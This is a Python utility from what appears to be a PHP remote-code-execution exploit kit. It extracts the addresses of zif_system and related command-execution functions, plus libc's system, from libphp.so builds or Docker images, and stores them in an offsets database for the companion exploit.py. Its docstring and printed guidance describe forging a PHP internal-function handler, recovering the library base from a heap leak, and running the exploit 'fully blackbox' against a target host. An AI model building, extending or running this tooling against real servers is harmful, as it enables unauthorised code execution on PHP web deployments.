#!/usr/bin/env python3
"""
Derive the build-specific offsets used by exploit.py from a target libphp.so.

Two constants in exploit.py are compiled into each PHP build:

  ZIF_OFFSET   offset (vaddr) of the `zif_system` symbol inside libphp.so.
               zif_system is the C function behind PHP's `system()`; the forged
               zend_internal_function's `handler` is set to libphp_base + this.

  DTOR_OFFSET  offset of the "anchor" code pointer that exploit.py uses to
               recover the libphp base address from the stage-2 heap leak.
               (`libphp_base = leaked_pointer - DTOR_OFFSET`.)

Usage:
    python3 derive_offsets.py /path/to/libphp.so
    python3 derive_offsets.py --docker php2shell-target:8.4.26

The container form extracts libphp.so straight out of a (built) Docker image,
which is handy because the image is the exact build the defaults target.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import tempfile


def nm_symbols(path: str) -> dict[str, int]:
    """Map symbol name -> value, using nm (plain, then readelf as fallback).

    `zif_system` is a *local* symbol (`t`) in most PHP builds, so `nm -D`
    (dynamic/exported only) misses it — use plain `nm` (portable across GNU
    and macOS/LLVM nm), which lists all symbols. `readelf` covers Linux hosts
    without `nm`.
    """
    for cmd in (
        ["nm", path],
        ["readelf", "-sW", path],
    ):
        try:
            out = subprocess.run(cmd, capture_output=True, text=True)
        except FileNotFoundError:
            continue
        if out.returncode != 0:
            continue
        symbols: dict[str, int] = {}
        for line in out.stdout.splitlines():
            # nm:      "0000000000465370 t zif_system"
            # readelf: " 22: 0000000000465370  133 FUNC GLOBAL DEFAULT 14 zif_system"
            m = re.match(r"\s*(?:[0-9]+:\s+)?([0-9a-fA-F]+)\s+.*?\s+([A-Za-z_][A-Za-z0-9_]+)\s*$", line)
            if m:
                symbols[m.group(2)] = int(m.group(1), 16)
        if symbols:
            return symbols
    return {}


def extract_from_docker(image: str) -> str:
    """Pull libphp.so out of a Docker image into a temp file and return its path."""
    try:
        out = subprocess.run(["docker", "create", image], capture_output=True, text=True)
    except FileNotFoundError as e:
        sys.exit("docker not found: %s" % e)
    if out.returncode != 0:
        sys.exit("docker create failed:\n%s" % out.stderr)
    cid = out.stdout.strip()
    # `docker exec` needs a *running* container; `docker create` leaves it
    # stopped. Find the path with a one-shot `docker run` instead, then `docker
    # cp` it out of the stopped container (cp works on a stopped container's fs).
    find = subprocess.run(
        ["docker", "run", "--rm", "--entrypoint", "sh", image, "-c",
         "find / -name 'libphp*.so' 2>/dev/null"],
        capture_output=True, text=True,
    )
    if find.returncode != 0:
        subprocess.run(["docker", "rm", cid], capture_output=True)
        sys.exit("find failed:\n%s" % find.stderr)
    paths = [p for p in find.stdout.splitlines() if p.strip()]
    if not paths:
        subprocess.run(["docker", "rm", cid], capture_output=True)
        sys.exit("no libphp*.so found inside image %s" % image)
    # Prefer a versioned /usr/local/lib path if present, else the first hit.
    lib = next((p for p in paths if "local/lib" in p), paths[0])
    tmp = tempfile.NamedTemporaryFile(suffix=".so", delete=False)
    cp = subprocess.run(["docker", "cp", f"{cid}:{lib}", tmp.name],
                        capture_output=True, text=True)
    subprocess.run(["docker", "rm", cid], capture_output=True)
    if cp.returncode != 0:
        sys.exit("docker cp failed:\n%s" % cp.stderr)
    print(f"[*] extracted {lib} -> {tmp.name}")
    return tmp.name


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("path", nargs="?", help="path to libphp.so")
    ap.add_argument("--docker", metavar="IMAGE", help="extract libphp.so from a Docker image")
    ap.add_argument("--append-db", action="store_true",
                    help="write/update an offsets.json entry (needs the --php-* fields + --dtor)")
    ap.add_argument("--php-version", help="exact PHP version, e.g. 8.4.26 (for --append-db)")
    ap.add_argument("--arch", default="amd64", help="build arch (default amd64)")
    ap.add_argument("--sapi", default="apache", help="web SAPI (default apache)")
    ap.add_argument("--distro", default="debian", help="distro tag (default debian)")
    ap.add_argument("--dtor", type=lambda x: int(x, 0), default=None,
                    help="DTOR_OFFSET anchor (required with --append-db; see notes below)")
    ap.add_argument("--libc", metavar="LIBC.SO", help="path to libc.so.6, to record libc_system_offset")
    a = ap.parse_args()

    path = extract_from_docker(a.docker) if a.docker else a.path
    if not path:
        ap.error("provide a libphp.so path, or --docker IMAGE")

    syms = nm_symbols(path)
    if "zif_system" not in syms:
        sys.exit("zif_system symbol not found in %s (stripped or wrong file?)" % path)

    zif = syms["zif_system"]
    print("ZIF_OFFSET  = 0x%x   (zif_system)" % zif)
    for extra in ("zif_exec", "zif_passthru", "zif_shell_exec"):
        if extra in syms:
            print("             = 0x%x   (%s)" % (syms[extra], extra))
    print()

    if a.append_db:
        if not a.php_version or a.dtor is None:
            ap.error("--append-db needs --php-version and --dtor")
        entry = {
            "id": "%s-%s-%s-%s" % (a.distro, a.arch, a.sapi, a.php_version),
            "distro": a.distro, "arch": a.arch, "sapi": a.sapi,
            "php_version": a.php_version,
            "zif_offset": "0x%x" % zif,
            "dtor_offset": "0x%x" % a.dtor,
        }
        if a.libc:
            lc = nm_symbols(a.libc)
            if "system" in lc:
                entry["libc_system_offset"] = "0x%x" % lc["system"]
                print("libc_system_offset = 0x%x   (from %s)" % (lc["system"], a.libc))
        db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "offsets.json")
        try:
            with open(db_path) as f:
                db = json.load(f)
        except (OSError, ValueError):
            db = {"builds": []}
        builds = db.setdefault("builds", [])
        for i, b in enumerate(builds):
            if b.get("id") == entry["id"]:
                # Upsert: keep fields we didn't re-supply (note, libc tag, …)
                # so re-deriving one build doesn't drop its annotations.
                merged = dict(b)
                merged.update(entry)
                builds[i] = merged
                break
        else:
            builds.append(entry)
        with open(db_path, "w") as f:
            json.dump(db, f, indent=2)
            f.write("\n")
        print("[+] wrote %s -> %s" % (entry["id"], db_path))
        return 0

    print("DTOR_OFFSET is *not* derivable by symbol name alone: it is the offset")
    print("of a stable code pointer that appears reliably in the stage-2 heap leak.")
    print("For a new build, the reference default is 0x65EB60 (php:8.4.26-apache).")
    print("To re-derive it: run exploit.py against a known-good lab build of the SAME")
    print("version, and inspect which leaked pointers satisfy")
    print("(ptr - candidate) % 0x1000 == 0 most frequently; the candidate that yields")
    print("a single consistent libphp base across leaks is your DTOR_OFFSET.")
    print()
    print("Add it to the DB with:")
    print("  python3 derive_offsets.py %s --append-db --php-version V --dtor 0x…" % path)
    print("Then run the exploit fully blackbox with:  exploit.py --host H --port P --auto")
    return 0


if __name__ == "__main__":
    sys.exit(main())
